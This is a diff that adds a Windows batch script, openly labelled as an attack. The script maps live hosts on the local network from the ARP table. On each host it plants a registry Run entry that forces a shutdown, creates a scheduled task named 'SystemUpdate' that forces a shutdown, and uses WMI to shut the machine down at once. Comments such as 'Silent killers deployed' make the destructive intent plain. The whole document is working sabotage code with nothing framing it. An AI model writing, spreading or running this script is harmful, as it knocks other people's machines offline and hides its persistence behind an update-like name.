@@ -1,0 +1,19 @@
+@echo off
+echo [Stealth Mode: Activated]
+:: Phase 1 - Network Mapping
+arp -a | find "dynamic" > live_hosts.txt
+
+:: Phase 2 - Slow Death Injection
+for /f "tokens=1" %%i in (live_hosts.txt) do (
+    if not "%%i"=="Interface:" (
+        :: Remote Registry Attack
+        reg add "\\%%i\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "LisaDeath" /t REG_SZ /d "shutdown /s /f /t 60" /f
+        
+        :: Scheduled Task Massacre
+        schtasks /create /s %%i /tn "SystemUpdate" /tr "shutdown /s /f /t 30" /sc once /st 23:59 /f
+        
+        :: WMI Execution Kill
+        wmic /node:%%i process call create "shutdown /s /f /t 0"
+    )
+)
+echo Silent killers deployed. They will die slowly...
